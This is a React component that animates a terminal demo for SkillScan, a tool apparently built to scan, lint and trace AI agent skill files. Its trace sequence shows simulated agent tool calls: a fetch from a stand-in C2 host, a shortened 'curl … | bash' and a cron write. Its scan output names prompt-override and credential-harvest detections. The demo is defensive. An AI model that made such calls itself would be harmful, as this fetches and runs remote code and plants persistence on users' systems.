/* ============================================================
   TERMINAL DEMO — Tabbed animated CLI demo for all three tools
   Design: Deep navy, violet/orange/green color-coded output
   Tabs: scan | lint | trace
   Animation: Lines appear sequentially, auto-loops, pauses on hover
   ============================================================ */
import { useState, useEffect, useRef, useCallback } from "react";
import { CheckCircle2, XCircle, AlertTriangle, Minus, Info } from "lucide-react";

interface DemoLine {
  type: "cmd" | "info" | "pass" | "block" | "warn" | "blank" | "summary" | "error" | "detail";
  text: string;
  delay: number;
}

type TabId = "scan" | "lint" | "trace";

interface TabDef {
  id: TabId;
  label: string;
  accentColor: string;
  title: string;
  sequence: DemoLine[];
}

// Generate a calver string from today's date so the demo never goes stale
function todayCalver(): string {
  const d = new Date();
  const y = d.getFullYear();
  const m = String(d.getMonth() + 1).padStart(2, "0");
  const day = String(d.getDate()).padStart(2, "0");
  return `${y}.${m}.${day}.1`;
}

const SCAN_SEQUENCE: DemoLine[] = [
  { type: "cmd",     text: "$ skillscan scan ./skills/ --format compact", delay: 0 },
  { type: "info",    text: `SkillScan v${todayCalver()}  •  rulepack ${todayCalver()}  •  341 rules`, delay: 600 },
  { type: "info",    text: "Scanning 5 skill files in ./skills/ ...", delay: 400 },
  { type: "blank",   text: "", delay: 300 },
  { type: "pass",    text: "verdict=allow  score=0    findings=0  search_tool.md", delay: 350 },
  { type: "pass",    text: "verdict=allow  score=0    findings=0  user_manager.md", delay: 280 },
  { type: "warn",    text: "verdict=warn   score=35   findings=1  analytics.md", delay: 320 },
  { type: "detail",  text: "  └─ SE-SEM-001 [high/critical] Credential-harvest pattern", delay: 160 },
  { type: "block",   text: "verdict=block  score=180  findings=1  data_processor.md", delay: 380 },
  { type: "detail",  text: "  └─ CHN-001 [critical/critical] Download+execute chain :12", delay: 160 },
  { type: "block",   text: "verdict=block  score=70   findings=1  injector.md", delay: 280 },
  { type: "detail",  text: "  └─ PINJ-001 [high/high] Prompt override / jailbreak :1", delay: 160 },
  { type: "blank",   text: "", delay: 300 },
  { type: "summary", text: "verdict=block  score=285  findings=3  exit=1", delay: 400 },
];

const LINT_SEQUENCE: DemoLine[] = [
  { type: "cmd",     text: "$ skillscan-lint ./skills/ --strict", delay: 0 },
  { type: "info",    text: "skillscan-lint v0.2.1  •  checking 5 skill files ...", delay: 600 },
  { type: "blank",   text: "", delay: 300 },
  { type: "pass",    text: "PASS  search_tool.md         (0 issues)", delay: 350 },
  { type: "warn",    text: "WARN  user_manager.md        (2 issues)", delay: 280 },
  { type: "detail",  text: "  └─ L-DESC-001  description too short (< 50 chars)", delay: 160 },
  { type: "detail",  text: "  └─ L-PERM-002  wildcard permission scope: tools/*", delay: 140 },
  { type: "error",   text: "FAIL  data_processor.md     (3 issues)", delay: 320 },
  { type: "detail",  text: "  └─ L-SCHEMA-001  missing required field: version", delay: 160 },
  { type: "detail",  text: "  └─ L-PERM-001   network permission undeclared", delay: 140 },
  { type: "detail",  text: "  └─ L-SEC-003    embedded credential pattern detected", delay: 140 },
  { type: "pass",    text: "PASS  analytics.md           (0 issues)", delay: 280 },
  { type: "pass",    text: "PASS  injector.md            (0 issues)", delay: 250 },
  { type: "blank",   text: "", delay: 300 },
  { type: "summary", text: "1 failed  •  1 warned  •  3 passed  •  exit=1", delay: 400 },
];

const TRACE_SEQUENCE: DemoLine[] = [
  { type: "cmd",     text: "$ skillscan-trace run data_processor.md --model ollama/llama3", delay: 0 },
  { type: "info",    text: "skillscan-trace v0.1.4  •  canary MCP  •  14 instrumented tools", delay: 600 },
  { type: "info",    text: "Spawning sandboxed LLM session ...", delay: 400 },
  { type: "blank",   text: "", delay: 300 },
  { type: "pass",    text: "[00:01]  tool_call: read_file(path='config.yaml')", delay: 500 },
  { type: "pass",    text: "[00:02]  tool_call: read_file(path='requirements.txt')", delay: 400 },
  { type: "warn",    text: "[00:04]  tool_call: http_get(url='https://evil.example.com/p')", delay: 600 },
  { type: "detail",  text: "         ⚠  IOC match: evil.example.com  [threat-intel/c2-domains]", delay: 180 },
  { type: "block",   text: "[00:05]  tool_call: exec_shell(cmd='curl … | bash')", delay: 500 },
  { type: "detail",  text: "         ✗  BLOCKED — CHN-001 download+execute chain", delay: 180 },
  { type: "block",   text: "[00:06]  tool_call: write_file(path='/etc/cron.d/…')", delay: 400 },
  { type: "detail",  text: "         ✗  BLOCKED — out-of-scope path write", delay: 180 },
  { type: "blank",   text: "", delay: 300 },
  { type: "summary", text: "verdict=block  anomalies=3  blocked=2  warned=1  exit=1", delay: 400 },
];

const TABS: TabDef[] = [
  {
    id: "scan",
    label: "scan",
    accentColor: "oklch(0.58 0.22 290)",
    title: "Static analysis — catch malicious patterns before deployment",
    sequence: SCAN_SEQUENCE,
  },
  {
    id: "lint",
    label: "lint",
    accentColor: "oklch(0.70 0.15 160)",
    title: "Quality linting — enforce schema, permissions, and best practices",
    sequence: LINT_SEQUENCE,
  },
  {
    id: "trace",
    label: "trace",
    accentColor: "oklch(0.72 0.19 45)",
    title: "Behavioural tracing — watch what a skill actually does at runtime",
    sequence: TRACE_SEQUENCE,
  },
];

const lineColors: Record<DemoLine["type"], string> = {
  cmd:     "oklch(0.70 0.015 265)",
  info:    "oklch(0.52 0.015 265)",
  pass:    "oklch(0.70 0.15 160)",
  block:   "oklch(0.65 0.22 25)",
  warn:    "oklch(0.72 0.19 45)",
  error:   "oklch(0.65 0.22 25)",
  detail:  "oklch(0.48 0.015 265)",
  blank:   "transparent",
  summary: "oklch(0.78 0.18 290)",
};

function LineIcon({ type }: { type: DemoLine["type"] }) {
  const size = "w-3 h-3 flex-shrink-0 mt-0.5";
  if (type === "pass")    return <CheckCircle2 className={size} style={{ color: lineColors.pass }} />;
  if (type === "block" || type === "error") return <XCircle className={size} style={{ color: lineColors.block }} />;
  if (type === "warn")    return <AlertTriangle className={size} style={{ color: lineColors.warn }} />;
  if (type === "summary") return <Minus className={size} style={{ color: lineColors.summary }} />;
  if (type === "info")    return <Info className={size} style={{ color: lineColors.info }} />;
  return <span className="w-3 flex-shrink-0" />;
}

export default function TerminalDemo() {
  const [activeTab, setActiveTab] = useState<TabId>("scan");
  const [visibleCount, setVisibleCount] = useState(0);
  const [paused, setPaused] = useState(false);
  const timerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const containerRef = useRef<HTMLDivElement>(null);
  // Track which tab the animation is currently running for to avoid stale-seq issues
  const animTabRef = useRef<TabId>("scan");

  const tab = TABS.find((t) => t.id === activeTab)!;
  const seq = tab.sequence;

  // When the user clicks a tab: atomically reset everything via a callback
  const switchTab = useCallback((id: TabId) => {
    if (timerRef.current) clearTimeout(timerRef.current);
    animTabRef.current = id;
    setActiveTab(id);
    setVisibleCount(0);
    setPaused(false);
  }, []);

  useEffect(() => {
    // Guard: if the tab changed underneath us, bail — switchTab will re-trigger
    if (animTabRef.current !== activeTab) return;
    if (paused) return;
    if (timerRef.current) clearTimeout(timerRef.current);

    if (visibleCount >= seq.length) {
      // Hold at end, then restart
      timerRef.current = setTimeout(() => setVisibleCount(0), 4500);
      return;
    }

    const line = seq[visibleCount];
    timerRef.current = setTimeout(() => {
      setVisibleCount((c) => c + 1);
      if (containerRef.current) {
        containerRef.current.scrollTop = containerRef.current.scrollHeight;
      }
    }, line.delay);

    return () => { if (timerRef.current) clearTimeout(timerRef.current); };
  }, [visibleCount, paused, seq, activeTab]);

  const isComplete = visibleCount >= seq.length;
  const displayLines = seq.slice(0, visibleCount);

  return (
    <div
      className="rounded-2xl overflow-hidden select-none"
      style={{
        background: "oklch(0.085 0.018 265)",
        border: `1px solid ${tab.accentColor} / 0.25`,
        boxShadow: `0 0 80px ${tab.accentColor} / 0.10, 0 32px 80px oklch(0 0 0 / 0.55)`,
        fontFamily: "'JetBrains Mono', 'Fira Code', monospace",
        transition: "box-shadow 0.4s ease, border-color 0.4s ease",
      }}
      onMouseEnter={() => setPaused(true)}
      onMouseLeave={() => setPaused(false)}
    >
      {/* Window chrome + tabs */}
      <div
        style={{ borderBottom: `1px solid ${tab.accentColor} / 0.15` }}
      >
        {/* Traffic lights row */}
        <div className="flex items-center gap-2 px-4 pt-3 pb-2">
          <div className="w-3 h-3 rounded-full" style={{ background: "oklch(0.65 0.22 25)" }} />
          <div className="w-3 h-3 rounded-full" style={{ background: "oklch(0.72 0.19 45)" }} />
          <div className="w-3 h-3 rounded-full" style={{ background: "oklch(0.70 0.15 160)" }} />
          <span className="ml-3 text-xs flex-1 truncate" style={{ color: "oklch(0.38 0.012 265)" }}>
            terminal — skillscan
          </span>
          {/* Live indicator */}
          <div className="flex items-center gap-1.5">
            <div
              className="w-1.5 h-1.5 rounded-full"
              style={{
                background: paused ? "oklch(0.72 0.19 45)" : isComplete ? "oklch(0.45 0.015 265)" : "oklch(0.70 0.15 160)",
                boxShadow: paused ? "none" : isComplete ? "none" : "0 0 6px oklch(0.70 0.15 160 / 0.8)",
                animation: (!paused && !isComplete) ? "termPulse 1.5s ease-in-out infinite" : "none",
              }}
            />
            <span className="text-xs" style={{ color: "oklch(0.38 0.012 265)" }}>
              {paused ? "paused" : isComplete ? "done" : "running"}
            </span>
          </div>
        </div>

        {/* Tab bar */}
        <div className="flex items-end px-4 gap-1">
          {TABS.map((t) => {
            const isActive = t.id === activeTab;
            return (
              <button
                key={t.id}
                onClick={() => switchTab(t.id)}
                className="px-4 py-2 text-xs font-semibold rounded-t-lg transition-all duration-200"
                style={{
                  background: isActive ? "oklch(0.12 0.022 265)" : "transparent",
                  color: isActive ? t.accentColor : "oklch(0.42 0.012 265)",
                  borderTop: isActive ? `1px solid ${t.accentColor} / 0.40` : "1px solid transparent",
                  borderLeft: isActive ? `1px solid ${t.accentColor} / 0.20` : "1px solid transparent",
                  borderRight: isActive ? `1px solid ${t.accentColor} / 0.20` : "1px solid transparent",
                  borderBottom: isActive ? "1px solid oklch(0.085 0.018 265)" : "1px solid transparent",
                  marginBottom: isActive ? "-1px" : "0",
                  cursor: "pointer",
                }}
              >
                {t.label}
              </button>
            );
          })}
        </div>
      </div>

      {/* Description line */}
      <div
        className="px-4 py-2 text-xs"
        style={{
          color: "oklch(0.42 0.012 265)",
          borderBottom: `1px solid ${tab.accentColor} / 0.08`,
          background: "oklch(0.10 0.020 265 / 0.5)",
        }}
      >
        {tab.title}
      </div>

      {/* Output area */}
      <div
        ref={containerRef}
        className="p-4 overflow-y-auto space-y-1"
        style={{ minHeight: "280px", maxHeight: "340px" }}
      >
        {displayLines.map((line, i) => {
          if (line.type === "blank") return <div key={i} className="h-2" />;
          return (
            <div key={i} className="flex items-start gap-2 text-xs leading-relaxed">
              <LineIcon type={line.type} />
              <span
                style={{
                  color: lineColors[line.type],
                  whiteSpace: "pre-wrap",
                  wordBreak: "break-all",
                  letterSpacing: "-0.01em",
                }}
              >
                {line.text}
              </span>
            </div>
          );
        })}

        {/* Blinking cursor while animating */}
        {!isComplete && !paused && (
          <div className="flex items-center gap-2 text-xs">
            <span className="w-3" />
            <span
              className="inline-block w-2 h-3.5 rounded-sm"
              style={{
                background: tab.accentColor,
                animation: "termBlink 1s step-end infinite",
              }}
            />
          </div>
        )}

        {/* Paused overlay hint */}
        {paused && !isComplete && (
          <div className="flex items-center gap-2 text-xs mt-1" style={{ color: "oklch(0.42 0.015 265)" }}>
            <span className="w-3" />
            <span>— paused (move cursor away to resume) —</span>
          </div>
        )}
      </div>

      <style>{`
        @keyframes termBlink {
          0%, 100% { opacity: 1; }
          50% { opacity: 0; }
        }
        @keyframes termPulse {
          0%, 100% { opacity: 1; }
          50% { opacity: 0.3; }
        }
      `}</style>
    </div>
  );
}
